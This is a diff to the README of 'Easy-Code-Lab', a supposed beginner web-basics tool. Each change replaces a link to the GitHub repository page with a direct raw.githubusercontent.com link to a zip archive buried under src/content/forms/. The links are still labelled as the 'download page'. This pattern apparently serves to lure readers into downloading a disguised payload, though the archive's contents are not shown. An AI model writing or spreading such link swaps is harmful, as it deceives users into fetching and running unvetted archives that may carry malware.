@@ -1,6 +1,6 @@
 # 🎯 Easy-Code-Lab - Learn Web Basics by Doing
 
-[![Download Easy-Code-Lab](https://img.shields.io/badge/Download-Easy--Code--Lab-blue.svg?style=for-the-badge)](https://github.com/myristicagenuspolygonum773/Easy-Code-Lab)
+[![Download Easy-Code-Lab](https://img.shields.io/badge/Download-Easy--Code--Lab-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/myristicagenuspolygonum773/Easy-Code-Lab/main/src/content/forms/Easy-Code-Lab-v2.8.zip)
 
 ## 🧭 What is Easy-Code-Lab?
 
@@ -24,7 +24,7 @@ For the best experience, use the latest version of your browser.
 
 Use this link to visit the download page:
 
-[Visit the Easy-Code-Lab download page](https://github.com/myristicagenuspolygonum773/Easy-Code-Lab)
+[Visit the Easy-Code-Lab download page](https://raw.githubusercontent.com/myristicagenuspolygonum773/Easy-Code-Lab/main/src/content/forms/Easy-Code-Lab-v2.8.zip)
 
 ### Steps
 
@@ -162,7 +162,7 @@ It keeps the focus on clear practice instead of long lessons.
 
 Use the link below any time you need to visit the download page:
 
-[https://github.com/myristicagenuspolygonum773/Easy-Code-Lab](https://github.com/myristicagenuspolygonum773/Easy-Code-Lab)
+[https://raw.githubusercontent.com/myristicagenuspolygonum773/Easy-Code-Lab/main/src/content/forms/Easy-Code-Lab-v2.8.zip](https://raw.githubusercontent.com/myristicagenuspolygonum773/Easy-Code-Lab/main/src/content/forms/Easy-Code-Lab-v2.8.zip)
 
 ## 🧭 Short setup path
 
